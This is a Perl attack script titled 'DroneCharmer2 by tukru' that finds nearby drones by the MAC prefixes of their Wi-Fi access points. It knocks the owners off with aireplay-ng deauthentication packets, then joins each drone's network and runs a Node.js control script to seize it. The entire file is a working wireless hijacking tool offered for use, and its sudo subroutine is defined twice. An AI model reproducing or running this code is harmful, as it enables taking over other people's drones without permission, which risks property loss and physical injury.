#!/usr/bin/perl

# DroneCharmer2 by tukru
# This software detects drones, disconnects the owner, and takes control.

use strict;

my @drone_macs = qw/90:03:B7 00:12:1C 90:3A:E6 A0:14:3D 00:12:1C 00:26:7E/;
my $interface  = shift || "wlan1";
my $interface2 = shift || "wlan0";
my $controljs  = shift || "drone_control/drone_pwn.js";

my $dhclient = "dhclient";
my $iwconfig = "iwconfig";
my $ifconfig = "ifconfig";
my $airmon   = "airmon-ng";
my $aireplay = "aireplay-ng";
my $airodump = "airodump-ng";
my $nodejs   = "nodejs";

my $tmpfile = "/tmp/dronestrike";
my %skyjacked;

sub sudo {
    print "Running: @_\n";
    system("sudo", @_);
}

sub monitor_mode {
    sudo($ifconfig, $interface, "down");
    sudo($airmon, "start", $interface);
}

while (1) {
    monitor_mode();

    eval {
        local $SIG{INT} = sub { die };
        my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
        sleep 2;
        sudo("kill", $pid);
        sleep 1;
        sudo("killall", "-9", $aireplay, $airodump);
        close(DUMP);
    };

    sleep 4;
    my %clients;
    my %chans;
    foreach my $tmpfile1 (glob("$tmpfile*.csv")) {
        open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
        while (<APS>) {
            s/[\0\r]//g;
            foreach my $dev (@drone_macs) {
                if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/) {
                    $chans{$1} = [$2, $3];
                }
                if (/^([\w:]+).*\s($dev:[\w:]+),/) {
                    $clients{$1} = $2;
                }
            }
        }
        close(APS);
        sudo("rm", $tmpfile1);
    }

    foreach my $cli (keys %clients) {
        sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
        sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interface);
    }

    foreach my $drone (keys %chans) {
        next if $skyjacked{$chans{$drone}[1]}++;
        sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
        sudo($dhclient, "-v", $interface2);
        sudo($nodejs, $controljs);
    }

    sleep 5;
}

sub sudo {
    print "Running: @_\n";
    system("sudo", @_);
}
